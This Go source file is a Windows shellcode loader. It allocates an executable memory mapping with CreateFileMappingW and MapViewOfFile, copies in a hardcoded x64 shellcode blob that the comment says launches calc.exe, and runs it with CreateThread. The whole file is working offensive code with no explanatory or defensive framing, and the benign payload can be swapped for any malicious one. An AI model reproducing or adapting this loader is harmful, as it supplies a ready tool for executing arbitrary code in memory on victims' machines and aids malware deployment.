package main

import (
    "fmt"
    "syscall"
    "unsafe"
)

var (
    kernel32              = syscall.NewLazyDLL("kernel32.dll")
    CreateFileMappingW    = kernel32.NewProc("CreateFileMappingW")
    MapViewOfFile         = kernel32.NewProc("MapViewOfFile")
    CreateThread          = kernel32.NewProc("CreateThread")
    WaitForSingleObject   = kernel32.NewProc("WaitForSingleObject")
    CloseHandle           = kernel32.NewProc("CloseHandle")
)

func main() {
    // start calc.exe
    shellcode := []byte{
        0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
        0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
        0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
        0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
        0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
        0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
        0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
    }

    fmt.Println("[+] Creating a mapping file")
    hfile, _, err := CreateFileMappingW.Call(
        uintptr(0xFFFFFFFFFFFFFFFF), // INVALID_HANDLE_VALUE
        0,
        syscall.PAGE_EXECUTE_READWRITE,
        0,
        uintptr(len(shellcode)),
        0,
    )
    if hfile == 0 {
        panic(fmt.Sprintf("[!] CreateFileMappingW Failed With Error: %v", err))
    }

    fmt.Println("[+] Mapping the file object")
    mapaddr, _, err := MapViewOfFile.Call(
        hfile,
        syscall.FILE_MAP_WRITE|syscall.FILE_MAP_EXECUTE,
        0,
        0,
        uintptr(len(shellcode)),
    )
    if mapaddr == 0 {
        panic(fmt.Sprintf("[!] MapViewOfFile Failed With Error: %v", err))
    }

    fmt.Println("[+] Copying shellcode to mapped memory")
    copy((*[276]byte)(unsafe.Pointer(mapaddr))[:], shellcode)

    fmt.Println("[+] Creating a thread")
    hthread, _, err := CreateThread.Call(
        0,
        0,
        mapaddr,
        0,
        0,
        0,
    )
    if hthread == 0 {
        panic(fmt.Sprintf("[!] CreateThread Failed With Error: %v", err))
    }

    fmt.Println("[+] Thread Executed!!")
    WaitForSingleObject.Call(hthread, syscall.INFINITE)
    CloseHandle.Call(hthread)
}
